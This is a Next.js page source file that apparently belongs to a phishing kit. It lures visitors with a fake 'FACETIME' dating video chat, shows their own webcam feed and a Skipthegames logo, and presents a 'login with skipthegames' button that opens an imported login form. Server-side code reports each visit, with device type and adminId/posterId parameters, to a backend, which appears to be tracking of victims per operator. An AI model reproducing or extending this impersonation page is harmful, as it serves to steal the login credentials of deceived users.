import { useState } from 'react';
import { API_URL, site } from '../../../config';
import Image from 'next/image';
import LoginForm from '../../../components/LoginForm';
import Webcam from 'react-webcam';

// import Login from '../../../components/Login';
// import Webcam from 'react-webcam';

export default function Home() {
  const [showForm, setShowForm] = useState(false);

  return (
    <div className="relative  h-screen w-screen flex flex-col justify-center items-center">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
      />
      <div className="absolute mx-auto mt-7 flex flex-col justify-center items-center inset-0 font-sans  max-w-sm">
        {!showForm ? (
          <div className="mx-auto mt-7 flex flex-col justify-center items-center inset-0 font-sans  max-w-sm">
            <div className="flex justify-center">
              <Image src="/images/pngegg.png" width={70} height={70} />
            </div>
            <h1 className="text-center font-bold text-3xl mb-3 text-[#5CF777]">
              FACETIME
            </h1>
            <h1 className="text-xl font-semibold">
              Login With Skipthegames and enjoy with Facetime video chat your
              dating partner.
            </h1>
            <button
              className="bg-blue-400 py-2 px-5 rounded-md block mt-5 w-full"
              onClick={() => setShowForm(true)}
            >
              <div className="flex justify-center">
                <Image
                  src="/images/logo.png"
                  alt="skipthegame logo"
                  width={200}
                  height={50}
                />
              </div>
              <p className="text-center text-white font-semibold text-xl">
                login with skipthegames
              </p>
            </button>
          </div>
        ) : (
          <LoginForm />
        )}
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers['user-agent'];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? 'phone' : isTabletView ? 'ipad' : 'desktop';

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  try {
    const res = await fetch(url);
    console.log(res);
    const data = await res.json();
    return {
      props: {},
    };
  } catch (error) {
    console.log(error);
  }

  // if (data?.success !== 'exists') {
  //   return {
  //     notFound: true,
  //   };
  // }
}
